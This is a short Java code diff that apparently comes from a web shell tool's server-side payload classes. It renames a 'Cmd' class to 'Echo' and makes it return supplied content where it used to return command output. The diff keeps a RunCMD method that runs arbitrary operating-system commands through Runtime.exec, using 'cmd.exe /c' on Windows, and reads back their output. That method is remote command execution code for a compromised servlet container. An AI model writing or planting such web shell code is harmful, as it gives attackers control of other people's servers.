@@ -14,8 +14,8 @@ import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
 import java.util.Map;
 
-public class Cmd {
-    public static String cmd;
+public class Echo {
+    public static String content;
     private ServletRequest Request;
     private ServletResponse Response;
     private HttpSession Session;
@@ -28,7 +28,7 @@ public class Cmd {
         page.getResponse().setCharacterEncoding("UTF-8");
         Map<String, String> result = new HashMap<>();
         try {
-            result.put("msg", RunCMD(cmd));
+            result.put("msg", content);
             result.put("status", "success");
             try {
                 ServletOutputStream so = this.Response.getOutputStream();
@@ -66,16 +66,16 @@ public class Cmd {
         return true;
     }
 
-    private String RunCMD(String cmd2) throws Exception {
+    private String RunCMD(String cmd) throws Exception {
         Process p;
         Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
-        if (cmd2 == null || cmd2.length() <= 0) {
+        if (cmd == null || cmd.length() <= 0) {
             return "";
         }
         if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
-            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd2});
+            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
         } else {
-            p = Runtime.getRuntime().exec(cmd2);
+            p = Runtime.getRuntime().exec(cmd);
         }
         BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
         String disr = br.readLine();
